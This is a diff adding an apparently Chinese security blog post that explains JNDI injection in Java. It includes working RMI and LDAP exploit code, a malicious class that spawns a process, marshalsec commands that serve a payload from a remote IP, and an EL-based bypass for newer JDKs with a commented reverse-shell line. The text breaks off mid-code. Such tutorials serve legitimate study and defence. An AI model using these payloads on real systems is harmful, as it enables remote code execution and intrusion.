@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="基础 JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，同的访问提供者实现 JNDI 服务供应接口 (SPI)，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。JNDI可访问的现有的目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="https://fru1ts.github.io/2024/09/24/JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="基础 JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，同的访问提供者实现 JNDI 服务供应接口 (SPI)，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。JNDI可访问的现有的目">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-24T19:22:21.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:26:50.579Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>JNDI注入 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JNDI注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-24 19:22" pubdate>
+          September 24, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          121 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JNDI注入</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h3>
+<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，同的访问提供者实现 JNDI 服务供应接口 (SPI)，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p>
+<ul>
+<li><code>LDAP</code>: 轻量级目录访问协议；名称也是从右到左进行逐级定义，各级以逗号分隔，每级为一个 <code>name=value</code> 对。比如一个 <code>LDAP</code> 名称如下:</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">cn</span>=John, <span class="hljs-attribute">o</span>=Sun, <span class="hljs-attribute">c</span>=US<br></code></pre></td></tr></table></figure>
+<ul>
+<li><code>RMI</code>: <code>Java Remote Method Invocation</code>，<code>Java</code> 远程方法调用；</li>
+<li><code>DNS</code>：域名服务</li>
+<li><code>NIS</code>: <code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；</li>
+<li><code>CORBA</code>: <code>Common Object Request Broker Architecture</code>，通用对象请求代理架构，用于 <code>COS</code> 名称服务(<code>Common Object Services</code>)；</li>
+</ul>
+
+<h4 id="naming-service-命名服务"><a class="markdownIt-Anchor" href="#naming-service-命名服务"></a> Naming Service 命名服务</h4>
+<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作。</p>
+<ul>
+<li>相关概念：
+<ul>
+<li><code>Bindings</code>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 <code>DNS</code> 中域名绑定到对应的 <code>IP</code>。</li>
+<li><code>Context</code>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (<code>subcontext</code>)。</li>
+<li><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 <code>C/C++</code> 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
+</ul>
+</li>
+</ul>
+<h4 id="directory-service-目录服务"><a class="markdownIt-Anchor" href="#directory-service-目录服务"></a> Directory Service 目录服务</h4>
+<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。</p>
+<h4 id="api"><a class="markdownIt-Anchor" href="#api"></a> API</h4>
+<p><code>JNDI</code>，即 <code>Java</code> 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code> 独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。</p>
+<h3 id="jndi注入"><a class="markdownIt-Anchor" href="#jndi注入"></a> JNDI注入</h3>
+<p>JNDI 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p>
+<p>JNDI 注入对 JAVA 版本有相应的限制，具体可利用版本如下：</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>JDK6</th>
+<th>JDK7</th>
+<th>JDK8</th>
+<th>JDK11</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LADP</td>
+<td>6u211以下</td>
+<td>7u201以下</td>
+<td>8u191以下</td>
+<td>11.0.1以下</td>
+</tr>
+<tr>
+<td>RMI</td>
+<td>6u132以下</td>
+<td>7u122以下</td>
+<td>8u113以下</td>
+<td>无</td>
+</tr>
+</tbody>
+</table>
+<p><strong>调用链</strong></p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">I<span class="hljs-function"><span class="hljs-title">nitialContext</span>.lookup-&gt;</span>G<span class="hljs-function"><span class="hljs-title">enericURLContext</span>.lookup-&gt;</span>R<span class="hljs-function"><span class="hljs-title">egistryContext</span>.lookup-&gt;</span>R<span class="hljs-function"><span class="hljs-title">egistryImpl_Stub</span>.lookup-&gt;</span>R<span class="hljs-function"><span class="hljs-title">egistryContext</span>.decodeObject-&gt;</span>N<span class="hljs-function"><span class="hljs-title">amingManager</span>.getObjectInstance-&gt;</span>N<span class="hljs-function"><span class="hljs-title">amingManager</span>.getObjectFactoryFromReference-&gt;</span><span class="hljs-function"><span class="hljs-title">helper</span>.loadClass-&gt;</span>helper.loadClass.newInstance<br></code></pre></td></tr></table></figure>
+<h4 id="rmi"><a class="markdownIt-Anchor" href="#rmi"></a> RMI</h4>
+<h5 id="低版本"><a class="markdownIt-Anchor" href="#低版本"></a> 低版本</h5>
+<p><strong>服务端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calculator&quot;</span>,<span class="hljs-string">&quot;Calculator&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:9090/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;RCE&quot;</span>,wrapper);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><strong>恶意类</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calculator</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><strong>客户端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>       String uri=<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RCE&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>不用工具不知道为什么服务端和客户端不在同一主机上打不了</p>
+<p>使用工具开恶意服务端<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">9090</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">8.138.10.69:9090</span>/#Calculator <span class="hljs-number">1099</span><br></code></pre></td></tr></table></figure>
+<h5 id="高版本"><a class="markdownIt-Anchor" href="#高版本"></a> 高版本</h5>
+<p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。</p>
+<p>依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>服务端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1089</span>);<br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\&quot;)&quot;));</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>            registry.bind(<span class="hljs-string">&quot;calc&quot;</span>, referenceWrapper);<br>            System.err.println(<span class="hljs-string">&quot;Server ready&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Server exception: &quot;</span> + e.toString());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><strong>客户端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>       String uri=<span class="hljs-string">&quot;rmi://127.0.0.1:1089/calc&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h4>
+<h5 id="低版本-2"><a class="markdownIt-Anchor" href="#低版本-2"></a> 低版本</h5>
+<p>下载<a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p>
+<p>添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>服务端</strong></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">工具</a>启动恶意服务端</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">8.138.10.69:9090</span>/#Calculator <span class="hljs-number">1099</span><br></code></pre></td></tr></table></figure>
+<p>或者用脚本（其实就是工具中的脚本）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 